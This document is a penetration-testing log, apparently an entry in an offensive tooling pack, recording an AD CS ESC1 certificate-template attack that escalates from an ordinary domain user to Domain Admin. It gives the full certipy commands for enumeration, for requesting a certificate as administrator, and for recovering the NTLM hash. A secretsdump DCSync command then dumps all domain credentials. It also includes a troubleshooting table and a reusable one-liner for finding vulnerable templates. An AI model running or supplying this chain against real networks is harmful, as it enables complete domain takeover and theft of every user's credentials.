# [2026-03] AD CS ESC1 certificate template abuse → Domain Admin

## Scenario category
Penetration testing / AD attacks

## Target overview
Abuse an ESC1-vulnerable AD CS certificate template to obtain a Domain Admin certificate as an ordinary domain user, then DCSync to dump every credential.

## Full execution chain

1. Obtain an ordinary domain user credential (via password spraying)
2. Enumerate the AD CS configuration with certipy
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Find an ESC1-vulnerable template (arbitrary SAN allowed, enrollable by low-privileged users)
4. Request a certificate as Domain Admin
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Authenticate with the certificate to recover the NTLM hash
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. DCSync to dump all credentials
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfalls encountered

| Problem | Cause | Fix | Time lost |
|------|------|---------|------|
| certipy find times out | LDAP connection blocked by the firewall | Specify DNS with -ns | 20min |
| Certificate request denied | Template requires Manager Approval | Switch to a template with no approval requirement | 10min |
| auth fails with KDC_ERR_PADATA | DC clock out of sync | Sync time with ntpdate and retry | 5min |

## Toolchain findings
- certipy is the tool of choice for AD CS attacks, more convenient than Certify.exe (pure Python, runs directly on Kali)
- DNS resolution must be correct or Kerberos authentication fails

## Key code and commands
See the execution chain above.

## Reusable patterns and script fragments
```bash
# End-to-end AD CS quick check
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Suggested improvements to this pack
- certipy is already in the Kali bootstrap manifest ✓
- routing.md already has a "Certipy/AD CS" route ✓

## Follow-up actions
- [x] No update needed (already covered)

## Environment
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022, AD CS deployed
- Domain functional level: 2016
